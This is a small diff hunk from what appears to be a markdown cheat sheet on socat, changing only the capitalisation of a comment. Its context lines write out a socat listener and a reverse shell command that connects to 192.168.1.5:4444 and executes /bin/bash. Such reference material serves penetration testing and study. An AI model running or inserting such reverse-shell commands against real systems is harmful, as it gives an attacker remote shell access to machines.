@@ -18,7 +18,7 @@ socat - TCP4:192.168.1.4:4444
 
 ### Reverse Shell
 ```
-socat -d -d TCP4-LISTEN:4444 STDOUT  # for verbosity (-d -d)
+socat -d -d TCP4-LISTEN:4444 STDOUT  # For Verbosity (-d -d)
 socat TCP4:192.168.1.5:4444 EXEC:/bin/bash
 ```
 
